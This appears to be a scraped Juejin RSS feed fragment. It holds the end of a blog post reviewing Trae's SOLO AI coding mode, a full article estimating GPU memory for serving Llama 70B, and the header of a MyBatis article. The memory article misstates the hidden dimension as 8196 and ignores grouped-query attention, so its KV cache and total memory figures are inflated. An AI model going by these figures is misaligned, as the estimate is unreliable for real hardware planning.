<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5004c1e574dd4118a65b83a9eb7097b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=%2BAMCRCcvHtx9%2Bj1hLPp3c%2Fkj80I%3D" alt="image.png" loading="lazy"/></p>
<p>第二次继续，改点数据看看，顺便调整一下布局</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df149e0d4b4e4aa39338da8b5b3e8063~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=TTX9fZwfQr3vhmK7nE57yV%2F%2F%2BVY%3D" alt="image.png" loading="lazy"/></p>
<p>任务执行完后查看变更，点击查看变更，右侧会显示两个折叠面板，一个描述需求，一个是代码变更</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dfea62001dd4036b56797256e6bb63c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=FYVBn65tECtMAc%2BxZStr7IjfCzI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d52a08d3d1941eeacf47e78be67f28a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=ClpQD4a8lvgaYK%2FjxfrU0skqCUg%3D" alt="image.png" loading="lazy"/></p>
<p>这两个明确的小改动目前 SOLO 项目中内容改的正确，整体表现还不错，<code>手动点赞</code></p>
<h3 data-id="heading-4">上点强度</h3>
<p>接下来继续上强度试试，添加一个图表，提供了标题，X轴和Y轴数据和描述</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d1925e7b921404386ab811d7e07c298~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=f8zs7bjObVI2Tf6WIHqoKpF5Uqs%3D" alt="image.png" loading="lazy"/></p>
<p>等了一会儿，执行完了，这个应该比较简单，只是加一个图表而已，应该问题不大，看着代码页没啥大问题</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d7f594af0224aca8b0e7e26b81d7680~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=BhvTV3fYHH4YlyG%2B%2Fg7sXnEL%2BFw%3D" alt="image.png" loading="lazy"/></p>
<p>页面上效果只是一个空白，框是加了一个，但是图表没渲染出来，而且位置不对，没有在对应的内容下面生成图表，可能描述的还不够准确，位置倒还好，主要内容没出来</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2886b62385be43a292064da1762b7dae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=d5k5FpPsdO0weeg1LqIaMVDrXW0%3D" alt="image.png" loading="lazy"/></p>
<p>这里的内容是在项目弹框中，用的tab切换显示的页面，可能加载时机有问题，目前浏览器控制台无报错，先问反馈一下 SOLO，再让它分析一下</p>
<p>它根据理解又哐哐改了几行代码，说这个 <code>现在，图表会在页面渲染完成后可靠初始化，并在切换到该页签时再次初始化，确保正常显示</code>，它只负责生成代码，说的好似它亲眼见过一样</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62ab09b5ee644981a1c862b1a5cbc797~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=EDKk3G3KEO0E6HpEpOdLfyRoTIM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07d8b7a804e3453490db720a73963fd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=%2BnfgZZfEEE%2BXJPSJtYl3SncRdm8%3D" alt="image.png" loading="lazy"/></p>
<p>浏览器控制台有警告，图表还是空框，完犊子了，这里的代码由于涉及到业务一些东西，估计它没整明白（也有可能是这个shi山项目里面的一坨一坨的代码误导的），得手动完整排查一下这部分相关代码了</p>
<h3 data-id="heading-5">恢复手动</h3>
<p>然后我把这个 Trae 关了，重新打开了一下项目</p>
<p>沃日啊，怎么切换了一下模式重启后，什么改动都没有了，就剩一个默认tab选项效果还在了</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c83c619b73fe4efc87570e1c1776559d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=mKw8suUIb6G3P5ZTMwDwirdJBF0%3D" alt="image.png" loading="lazy"/></p>
<p>又使用AI自动改代码翻车的节奏吗，不会又被坑一下午吧</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08627f1624e44235be9e988c97ecd064~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=WfFMUrL9rtOIDtvTBlGryUF2%2Bfk%3D" alt="B98613A4BEA6AC9A4DA6C0A602D6C164.gif" loading="lazy"/></p>
<h3 data-id="heading-6">虚惊一场</h3>
<p>这什么鬼，我查了代码，代码更新的部分也都有啊，缓存？</p>
<p>重新 pnpm run dev ， 把原来的浏览器关掉，重新用无痕打开，又好了，果然浏览器缓存搞的鬼（松了一口气）</p>
<p>切换成编辑器模式后，手动改代码测试，Trae 中有这么个操作，自动写入，自动格式化，大概需要几十秒，这个过程有点慢，体验不是很好</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d46cb9c4f324e0081ed82bb7ab0d29f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=SiLkjXvwNhhFhuVLXQxsz3UoewI%3D" alt="image.png" loading="lazy"/></p>
<p>我动了点东西，又提示 正在应用代码操作 “整理导入” 自动写入，自动格式化保存，是什么鬼，我改了个索引数字，两个地方，也需要几十秒，电脑系统 Win11家庭版，内存32G，CPU i5,就启动了 Trae，其他编辑器没开，我查了任务栏 CPU，内存使用率不高，但是这个体验好差呀</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8fa2e553d5644ac85ab321e36600722~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=ly%2B5MEpqtgy11GJYCfeVP1bUSAg%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">奇怪的自动化</h3>
<p>习惯了改点东西自动后保存后，一两秒就能在页面上效果，现在在 Trae 中自动保存，格式化完以后大约十几秒后，才能在页面上看到更新后的效果，我多次测试改几个数字或改一行代码页这样，啊...... (心态此时有点崩了)</p>
<p>难道是 Trae 中自动保存设置和一些插件一起工作不兼容的问题吗？我这边前端vue3项目，相关插件如下</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/71cf68dcc5ab4b9792f375b869785bfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=1qYFAXgZce6xeb8dNxztyITPgLE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9aa90be335fb491993e295a2c2f420ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557009&amp;x-signature=6IJdphvj%2BvA2b0X7jGWgCiRnprM%3D" alt="image.png" loading="lazy"/></p>
<p>由于进入手改模式后，这个自动保存格式化操作时间有点久，可能是我哪里设置问题？还是操作方式问题？插件是从 VSCode 中同步过来的，这些配置也是日常操作，出现这种明显这么久的时间延迟，还是有点奇怪的</p>
<p>@Trae 官网技术人员，有空看看，难道你们标配都是 Mac book Pro 顶配，然后流畅的不行吗</p>
<h2 data-id="heading-8">小结</h2>
<p>目前来看除了特别代码实现出来的奇葩的功能，常见的功能需求提示描述相对准确后，SOLO模式整体还是非常亮眼的，虽然中间有点小插曲，整体 Trae SOLO 模式还是非常亮眼的</p>
<p>由于自动保存格式化时间有点长，又由于后面的需求也不太好直观描述，并且代码也是特别乱，我就先不用 SOLO 模式了，先换 VSCode 把那种产品自己都讲不明白的需求改了，不然加班不知道几个小时起步了</p>
<blockquote>
<p>欢迎大家讨论交流，如果喜欢本文章或感觉文章有用，动动你那发财的小手点赞、收藏、关注再走呗 <code>^_^</code> </p>
<p>微信公众号：草帽lufei</p>
</blockquote>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e1fd6d3bc93444bbb257fc45e1826b11~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.jpg#?w=240&amp;h=240&amp;s=10632&amp;e=jpg&amp;b=fdfafa" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[部署大模型需要多少GPU显存?一文教你精准计算]]></title>    <link>https://juejin.cn/post/7575829296452157450</link>    <guid>https://juejin.cn/post/7575829296452157450</guid>    <pubDate>2025-11-24T06:57:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575829296452157450" data-draft-id="7575887863796989962" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="部署大模型需要多少GPU显存?一文教你精准计算"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-24T06:57:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="居然JuRan"/> <meta itemprop="url" content="https://juejin.cn/user/2524134427858205"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            部署大模型需要多少GPU显存?一文教你精准计算
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134427858205/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    居然JuRan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:57:21.000Z" title="Mon Nov 24 2025 06:57:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言:部署大模型的第一道门槛</h2>
<p>当我们准备部署一个大语言模型并提供服务时,最先遇到的问题往往是:<strong>我到底需要准备多少GPU显存?</strong></p>
<p>这不仅关系到硬件成本,更直接影响服务的并发能力和响应速度。今天,我们就以<strong>Llama 70B模型</strong>为例,手把手教你计算推理所需的GPU显存。</p>
<h2 data-id="heading-1">📋 案例参数设定</h2>
<p>让我们先明确计算的基础参数:</p>
<ul>
<li>
<p><strong>模型规模</strong>:Llama 70B(700亿参数)</p>
</li>
<li>
<p><strong>模型层数</strong>:80层</p>
</li>
<li>
<p><strong>上下文长度</strong>:最大支持32K tokens</p>
</li>
<li>
<p><strong>Hidden Dimension</strong>:8196</p>
</li>
<li>
<p><strong>参数精度</strong>:每个参数2个bytes(FP16)</p>
</li>
<li>
<p><strong>并发用户数</strong>:10个同时请求</p>
</li>
</ul>
<p>基于这些参数,我们开始逐步计算所需的GPU显存。</p>
<h2 data-id="heading-2">💾 第一部分:模型权重显存</h2>
<p>首先要计算的是<strong>模型本身占据的显存</strong>,因为我们需要把整个模型加载到GPU中。</p>
<p><strong>计算公式:</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">模型显存 = 参数量 × 每参数字节数
        = 70B × 2 bytes
        = 70 × 10^9 × 2 bytes
        = 140 GB
</code></pre>
<p>这个140GB是模型权重的基础占用,无论有多少用户请求,这部分都是固定的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1508643296c44d2eb3f0eb77c9b32cca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=b4afNJEwyOJdZGsBETAcC6fjXH4%3D" alt="GPU显存配置主图" loading="lazy"/></p>
<h2 data-id="heading-3">🚀 第二部分:KV Cache显存(重点!)</h2>
<p>这是显存占用的<strong>大头</strong>,也是最容易被忽视的部分。</p>
<h3 data-id="heading-4">什么是KV Cache?</h3>
<p>在大模型推理时,文本是<strong>逐个token生成</strong>的。为了加速这个过程,我们使用KV Cache机制来缓存中间计算结果。</p>
<p><strong>如果没有KV Cache</strong>,每生成一个新token,都需要重新计算之前所有token的注意力权重,这会导致大量重复计算,严重影响推理效率。</p>
<h3 data-id="heading-5">KV Cache显存计算</h3>
<p>KV Cache的计算分为两步:</p>
<p><strong>步骤1:计算单个token的KV Cache大小</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">单token显存 = 层数 × Hidden Dimension × 字节数 × 2(Key + Value)
           = 80 × 8196 × 2 bytes × 2
           = 2.5 MB
</code></pre>
<p><strong>步骤2:计算总KV Cache</strong></p>
<pre><code class="hljs language-plaintext" lang="plaintext">总KV Cache = 单token显存 × 上下文长度 × 并发用户数
          = 2.5 MB × 32K × 10
          = 2.5 MB × 32,000 × 10
          = 800 GB
</code></pre>
<p>注意:<strong>每个用户都需要独立的KV Cache</strong>,因为每个请求的上下文都不同。这就是为什么并发数对显存需求影响巨大!</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/904e61257eae4417a96ab7e5bb25052e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=nuMb5ZPq1UXzhG9iZQc0UGtEJsU%3D" alt="KV Cache工作原理图" loading="lazy"/></p>
<h2 data-id="heading-6">🔧 第三部分:其他显存开销</h2>
<p>除了模型权重和KV Cache,还有一些额外的显存占用:</p>
<h3 data-id="heading-7">1. Activation(激活值)</h3>
<p>神经网络每一层计算时产生的激活函数输出,需要暂存在显存中。</p>
<h3 data-id="heading-8">2. Buffers(缓冲区)</h3>
<p>存放中间变量的临时空间,计算完成后可能会被释放。</p>
<h3 data-id="heading-9">3. Overheads(开销)</h3>
<p>主要是显存碎片化导致的空间浪费。GPU显存分配是以block为单位的,可能会出现一些block未被充分利用的情况。</p>
<p><strong>估算方法:</strong></p>
<p>这些杂项通常按模型权重和KV Cache总和的**10%**来估算:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">其他开销 = (140 GB + 800 GB) × 10%
        = 94 GB
</code></pre>
<h2 data-id="heading-10">📊 总显存需求计算</h2>
<p>现在我们可以得出最终结果:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">总显存需求 = 模型权重 + KV Cache + 其他开销
          = 140 GB + 800 GB + 94 GB
          = 1,034 GB ≈ 1TB
</code></pre>
<p>也就是说,<strong>要支持10个并发用户使用Llama 70B模型,我们大约需要1TB的GPU显存!</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fb62a48e4154b358b50ac7533bb7e05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bGF54S2SnVSYW4=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764572241&amp;x-signature=wruF0I3MTWCOlhsuGoJcVvFr4aU%3D" alt="显存占用分布图" loading="lazy"/></p>
<h2 data-id="heading-11">💡 实用优化建议</h2>
<h3 data-id="heading-12">场景1:单用户场景</h3>
<p>如果只有1个用户,KV Cache显存大幅降低:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">KV Cache = 2.5 MB × 32K × 1 = 80 GB
总显存 = 140 + 80 + 22 = 242 GB
</code></pre>
<p>所需显存减少到<strong>约250GB</strong>,只需3-4张A100(80GB)即可。</p>
<h3 data-id="heading-13">场景2:更短的上下文</h3>
<p>实际应用中,很多请求的上下文长度远小于32K。如果平均上下文为8K:</p>
<pre><code class="hljs language-plaintext" lang="plaintext">KV Cache = 2.5 MB × 8K × 10 = 200 GB
总显存 = 140 + 200 + 34 = 374 GB
</code></pre>
<p>显存需求降低到<strong>约400GB</strong>,大幅节省成本。</p>
<h2 data-id="heading-14">🎯 总结与延伸</h2>
<p>通过本文的计算方法,你可以快速估算<strong>任何大模型</strong>在不同场景下的显存需求:</p>
<p><strong>关键计算要素:</strong></p>
<ol>
<li>
<p>✅ 模型参数量 × 参数精度</p>
</li>
<li>
<p>✅ KV Cache = 层数 × Hidden维度 × 上下文长度 × 并发数</p>
</li>
<li>
<p>✅ 其他开销约为总和的10%</p>
</li>
</ol>
<p><strong>重要提示:</strong></p>
<ul>
<li>
<p>本文计算基于<strong>标准KV Cache推理</strong>方式</p>
</li>
<li>
<p>实际还有许多<strong>显存优化技术</strong>(如PagedAttention、量化等)可以大幅降低显存需求</p>
</li>
<li>
<p>不同推理框架的实现也会影响实际显存占用</p>
</li>
</ul>
<p>想了解如何进一步优化显存使用?敬请关注后续文章,我们将深入讲解各种显存优化技术!</p>
<hr/>
<p><strong>你在部署大模型时遇到过显存不足的问题吗?欢迎在评论区分享你的经验!</strong> 👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[困扰我一整天的MyBatis"Invalid bound statement"问题，原来是因为这个不起眼的注解冲突！]]></title>    <link>https://juejin.cn/post/7575488180981563392</link>    <guid>https://juejin.cn/post/7575488180981563392</guid>    <pubDate>2025-11-24T06:16:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575488180981563392" data-draft-id="7575488180981530624" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="困扰我一整天的MyBatis&quot;Invalid bound statement&quot;问题，原来是因为这个不起眼的注解冲突！"/> <meta itemprop="keywords" content="MyBatis,面试"/> <meta itemprop="datePublished" content="2025-11-24T06:16:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员小胖"/> <meta itemprop="url" content="https://juejin.cn/user/1992752269369870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 